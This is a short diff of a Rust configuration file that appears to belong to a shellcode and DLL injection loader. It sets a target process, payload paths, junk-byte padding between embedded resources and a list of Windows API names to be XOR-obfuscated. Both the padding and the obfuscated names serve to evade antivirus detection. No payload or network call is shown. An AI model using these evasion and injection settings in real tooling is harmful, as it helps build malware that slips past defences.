@@ -1,15 +1,17 @@
 const RESOURCE_ID: u32 = 100;
 const RESOURCE_NAME: &'static str = "resource.bin";
 
-const TARGET_PROCESS: &'static str = "notepad.exe";
+// Optional paths
+const TARGET_PROCESS: &'static str = "";
 const SHELLCODE_PATH: &'static str = "";
 const DLL_PATH: &'static str = r"";
 
-//range for random byte generation. Will generate random amount of junk data between resource entries.
+// Range for random byte generation. Will generate random amount of junk data between resource entries.
 const RANGE_START: usize = 0;
 const RANGE_END: usize = 0x100;
+const RANGE: Range<usize> = RANGE_START..RANGE_END;
 
-static XOR_STRINGS: [&str; 40] = [
+static XOR_STRINGS: [&str; 41] = [
     "LoadLibraryA",
     "CryptAcquireContextW",
     "CryptCreateHash",
@@ -50,6 +52,7 @@ static XOR_STRINGS: [&str; 40] = [
     "GetCurrentProcess",
     "WriteFile",
     "CreateFileA",
+    "AcquireSRWLockExclusive",
 ];
 
 // Will try to automate the configs stuff, later. At the moment, doesn't work with 'cargo build'
